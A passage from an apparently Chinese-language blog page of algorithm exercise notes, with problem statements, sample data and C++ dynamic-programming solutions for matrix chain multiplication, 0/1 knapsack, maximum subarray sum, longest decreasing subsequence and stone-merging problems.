class="line">MengMengDa</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">26</span>][<span class="number">26</span>];</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Matrix</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> r,c;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> p[],<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>; i&lt;=len;i++) m[i][i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> r =<span class="number">2</span>; r&lt;=len;r++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= len-r+<span class="number">1</span>; i++)&#123;</span><br><span class="line"><span class="keyword">int</span> j = i + r<span class="number">-1</span>;</span><br><span class="line">m[i][j] = m[i+<span class="number">1</span>][j] + p[i<span class="number">-1</span>]*p[i]*p[j];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k =i+<span class="number">1</span> ;k &lt; j; k++)&#123;</span><br><span class="line">m[i][j] = min(m[i][j],m[i][k]+m[k+<span class="number">1</span>][j]+p[i<span class="number">-1</span>]*p[k]*p[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m[<span class="number">1</span>][len]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n,l;</span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n&gt;&gt;l)&#123;</span><br><span class="line"><span class="built_in">map</span>&lt;<span class="keyword">char</span>,Matrix&gt;my_map;</span><br><span class="line"><span class="keyword">int</span> p[<span class="number">105</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span>;i &lt;= n;i++)&#123;</span><br><span class="line"><span class="keyword">char</span> a;</span><br><span class="line"><span class="keyword">int</span> j,k;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a&gt;&gt;j&gt;&gt;k;</span><br><span class="line">Matrix tmp ;</span><br><span class="line">tmp.r = j;</span><br><span class="line">tmp.c = k;</span><br><span class="line">my_map[a] = tmp;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> words[<span class="number">101</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>; i &lt; l; i++)&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;words;</span><br><span class="line"><span class="keyword">int</span> lenw = <span class="built_in">strlen</span>(words);</span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">0</span>;</span><br><span class="line">p[<span class="number">0</span>] = my_map[words[<span class="number">0</span>]].r;</span><br><span class="line">p[<span class="number">1</span>] = my_map[words[<span class="number">0</span>]].c;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">1</span>; j &lt; lenw;j++)&#123; <span class="comment">//注意 </span></span><br><span class="line"><span class="keyword">if</span>(my_map[words[j]].r != my_map[words[j<span class="number">-1</span>]].c)&#123;</span><br><span class="line">flag  =<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">p[j+<span class="number">1</span>] = my_map[words[j]].c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(flag == <span class="number">1</span>) <span class="built_in">puts</span>(<span class="string">"MengMengDa"</span>);</span><br><span class="line"><span class="keyword">else</span> solve(p,lenw);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="01背包-考试考了类似的"><a href="#01背包-考试考了类似的" class="headerlink" title="01背包(考试考了类似的)"></a>01背包(考试考了类似的)</h3><h4 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h4><p>已知有N种物品和一个可容纳C重量的背包。每种物品i的重量为Wi，价值为Pi。那么，采用怎样的装包方法才会使装入背包物品的总价值最大。</p><h5 id="输入-7"><a href="#输入-7" class="headerlink" title="输入"></a>输入</h5><p>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=10)，代表测试数据个数。</p><p>接下来有T组测试数据。每组测试数据第一行为背包的重量C(C&lt;10000)和物品个数N(N&lt;1000)。接下来的N行分别为物品的重量cost(1&lt;=cost&lt;=100)和价值val(1&lt;=val&lt;=3000000)。（注意：结果可能超过int范围）</p><h5 id="输出-7"><a href="#输出-7" class="headerlink" title="输出"></a>输出</h5><p>对每组测试数据，输出其对应的所装物品的最大价值。</p><h5 id="样例输入-7"><a href="#样例输入-7" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">10 5</span><br><span class="line">2 6</span><br><span class="line">2 3</span><br><span class="line">6 5</span><br><span class="line">5 4</span><br><span class="line">4 6</span><br></pre></td></tr></table></figure><h5 id="样例输出-7"><a href="#样例输出-7" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">15</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> w[<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;,v[<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">1005</span>][<span class="number">10005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> x[<span class="number">1005</span>]=&#123;<span class="number">0</span>&#125;;<span class="comment">//标记作用</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*构造最优解*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(<span class="keyword">int</span> n,<span class="keyword">int</span> cost)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = n; i&gt;<span class="number">1</span>; i--)&#123;   <span class="comment">//注意这里可能会出错</span></span><br><span class="line">        <span class="keyword">if</span>( m[i][cost] == m[i<span class="number">-1</span>][cost] ) x[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            x[i]= <span class="number">1</span>;</span><br><span class="line">            cost -=w[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//cout&lt;&lt;1&lt;&lt;endl;</span></span><br><span class="line">    x[<span class="number">1</span>] = m[<span class="number">1</span>][cost]?<span class="number">1</span>:<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;=n; i++)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;x[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">            <span class="keyword">int</span> c,n;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;c&gt;&gt;n;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">1</span> ; i&lt;= n;i++)&#123;</span><br><span class="line">                <span class="built_in">cin</span>&gt;&gt;w[i]&gt;&gt;v[i];</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>;i &lt;= n; i++)&#123;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j =<span class="number">1</span>;j&lt;= c;j++)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(j &gt;= w[i]) m[i][j] = max(m[i<span class="number">-1</span>][j],m[i<span class="number">-1</span>][j-w[i]]+v[i]);</span><br><span class="line">                    <span class="keyword">else</span> m[i][j] = m[i<span class="number">-1</span>][j];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;m[n][c]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">         <span class="comment">//   output(n,c);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="最大子段和"><a href="#最大子段和" class="headerlink" title="最大子段和"></a>最大子段和</h3><h4 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定n个整数组成的序列a1,a2,…an, 求子段和ai+ai+1+…+aj（子段可为空集）的最大值。</p><h5 id="输入-8"><a href="#输入-8" class="headerlink" title="输入"></a>输入</h5><p>包含多组测试数据。第一行为一个整数T(1&lt;=T&lt;=20)，代表测试数据个数。</p><p>每组测试数据第一行为一个整数n，代表有n个整数(1&lt;=n&lt;=10000)。</p><p>接下来一行有n个数x(-1000&lt;=x&lt;=1000)。</p><h5 id="输出-8"><a href="#输出-8" class="headerlink" title="输出"></a>输出</h5><p>输出其对应的最大子段和。</p><h5 id="样例输入-8"><a href="#样例输入-8" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1</span><br><span class="line">6</span><br><span class="line">2 -11 4 13 -1 2</span><br></pre></td></tr></table></figure><h5 id="样例输出-8"><a href="#样例输出-8" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">18</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">10005</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">(<span class="keyword">int</span> len)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span> ; i&lt; len ;i++)&#123;</span><br><span class="line">      <span class="keyword">if</span>(k &gt; <span class="number">0</span>)&#123;</span><br><span class="line">        k += a[i];</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        k = a[i];</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="keyword">if</span>(k &gt; sum) sum = k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> T;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;T;</span><br><span class="line">    <span class="keyword">while</span>(T--)&#123;</span><br><span class="line">        <span class="keyword">int</span> n ;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;n;i++) <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        solve(n);</span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="求数组的最长递减子序列"><a href="#求数组的最长递减子序列" class="headerlink" title="求数组的最长递减子序列"></a>求数组的最长递减子序列</h3><h4 id="题目描述-9"><a href="#题目描述-9" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个整数序列，输出它的最长递减（注意不是“不递增”）子序列。</p><h5 id="输入-9"><a href="#输入-9" class="headerlink" title="输入"></a>输入</h5><p>输入包括两行，第一行包括一个正整数N（N&lt;=1000），表示输入的整数序列的长度。第二行包括用空格分隔开的N个整数，整数范围区间为[-30000,30000]。</p><h5 id="输出-9"><a href="#输出-9" class="headerlink" title="输出"></a>输出</h5><p>输出最长递减子序列，数字之间有一个空格。</p><h5 id="样例输入-9"><a href="#样例输入-9" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">8</span><br><span class="line">9 4 3 2 5 4 3 2</span><br></pre></td></tr></table></figure><h5 id="样例输出-9"><a href="#样例输出-9" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">9 5 4 3 2</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">205</span>];</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">205</span>];</span><br><span class="line"><span class="keyword">int</span> roud[<span class="number">205</span>];</span><br><span class="line"><span class="keyword">int</span> maxc;</span><br><span class="line"><span class="keyword">int</span> N;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">output</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(x)&#123;</span><br><span class="line">output(roud[x]);</span><br><span class="line"><span class="keyword">if</span>(maxc != x) <span class="built_in">cout</span>&lt;&lt;num[x]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="built_in">cout</span>&lt;&lt;num[x]&lt;&lt;<span class="built_in">endl</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;N;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i= <span class="number">1</span> ; i&lt;= N; i++) <span class="built_in">cin</span>&gt;&gt;num[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span> ; i &lt;= N ; i++)&#123;</span><br><span class="line">dp[i] = <span class="number">1</span>;</span><br><span class="line">roud[i] = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span> ; j &lt; i; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(num[j] &gt; num[i] &amp;&amp; dp[i] &lt; dp[j] +<span class="number">1</span> )&#123;</span><br><span class="line">dp[i] = dp[j] +<span class="number">1</span> ;</span><br><span class="line">roud[i] = j;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(dp[i] &gt; dp[maxc])&#123;</span><br><span class="line">maxc = i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">output(maxc);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="沙子的质量"><a href="#沙子的质量" class="headerlink" title="沙子的质量"></a>沙子的质量</h3><p>题目描述<br>设有N堆沙子排成一排，其编号为1，2，3，…，N（N&lt; =300）。每堆沙子有一定的数量，可以用一个整数来描述，现在要将N堆沙子合并成为一堆，每次只能合并相邻的两堆，合并的代价为这两堆沙子的数量之和，合并后与这两堆沙子相邻的沙子将和新堆相邻，合并时由于选择的顺序不同，合并的总代价也不相同，如有4堆沙子分别为1 3 5 2我们可以先合并1、2堆，代价为4，得到4 5 2又合并1，2堆，代价为9，得到9 2，再合并得到11，总代价为4+9+11=24，如果第二步是先合并2，3堆，则代价为7，得到4 7，最后一次合并代价为11，总代价为4+7+11=22；问题是：找出一种合理的方法，使总的代价最小。输出最小代价。</p><h5 id="输入-10"><a href="#输入-10" class="headerlink" title="输入"></a>输入</h5><p>第一行一个数N表示沙子的堆数N。 第二行N个数，表示每堆沙子的质量。 a[i]&lt; =1000。</p><h5 id="输出-10"><a href="#输出-10" class="headerlink" title="输出"></a>输出</h5><p>合并的最小代价。</p><h5 id="样例输入-10"><a href="#样例输入-10" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">1 3 5 2</span><br></pre></td></tr></table></figure><h5 id="样例输出-10"><a href="#样例输出-10" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">22</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">105</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">305</span>][<span class="number">305</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*这个题目就是另类的矩阵连乘*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i= <span class="number">1</span>; i &lt;= n;i++) &#123;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">a[i] += a[i<span class="number">-1</span>];</span><br><span class="line">m[i][i] = <span class="number">0</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> r =<span class="number">2</span>; r&lt;=n;r++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>; i&lt;=n-r+<span class="number">1</span>; i++ )&#123;</span><br><span class="line"><span class="keyword">int</span>  j = i+r<span class="number">-1</span>;</span><br><span class="line">m[i][j] = m[i+<span class="number">1</span>][j]+a[j]-a[i<span class="number">-1</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> k = i+<span class="number">1</span>; k&lt;j; k++)&#123;</span><br><span class="line">m[i][j] = min(m[i][j],m[i][k]+m[k+<span class="number">1</span>][j]+a[j]-a[i<span class="number">-1</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;m[<span class="number">1</span>][n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="节食的限制"><a href="#节食的限制" class="headerlink" title="节食的限制"></a>节食的限制</h3><h4 id="题目描述-10"><a href="#题目描述-10" class="headerlink" title="题目描述"></a>题目描述</h4><p>Bessie像她的诸多姊妹一样，因為从Farmer John的草地吃了太多美味的草而长出了太多的赘肉。所以FJ将她置於一个及其严格的节食计划之中。她每天不能吃多过H(5&lt;=H&lt;=45000)公斤的乾草。Bessie只能吃一整綑乾草；当她开始吃一綑乾草的之后就再也停不下来了。她有一个完整的N(1&lt;=n&lt;=50)綑可以给她当作晚餐的乾草的清单。她自然想要尽量吃到更多的乾草。很自然地，每綑乾草只能被吃一次（即使在列表中相同的重量可能出现2次，但是这表示的是两綑乾草，其中每綑乾草最多只能被吃掉一次）。 给定一个列表表示每綑乾草的重量Si(1&lt;=Si&lt;=H),求Bessie不超过节食的限制的前提下可以吃掉多少乾草（注意一旦她开始吃一綑乾草就会把那一綑乾草全部吃完）。</p><h5 id="输入-11"><a href="#输入-11" class="headerlink" title="输入"></a>输入</h5><p>第一行：两个由空格隔开的整数：H和N， 第2到N+1行：第i+1行是一个单独的整数，表示第i綑乾草的重量Si。</p><h5 id="输出-11"><a href="#输出-11" class="headerlink" title="输出"></a>输出</h5><p>一个单独的整数表示Bessie在限制范围内最多可以吃多少公斤的乾草。</p><h5 id="样例输入-11"><a href="#样例输入-11" class="headerlink" title="样例输入"></a>样例输入</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">56 4</span><br><span class="line">15</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td></tr></table></figure><h5 id="样例输出-11"><a href="#样例输出-11" class="headerlink" title="样例输出"></a>样例输出</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">56</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> m[<span class="number">50</span>][<span class="number">45000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> w[<span class="number">50</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*本质就是01背包*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> h,n;</span><br><span class="line"><span class="built_in">cin</span>&gt;&gt;h&gt;&gt;n;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span> ; i&lt;= n; i++)<span class="built_in">cin</span>&gt;&gt;w[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;= n; i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span> ; j&lt;=h; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(j &gt;= w[i]) m[i][j]=max(m[i<span class="number">-1</span>][j],m[i<span 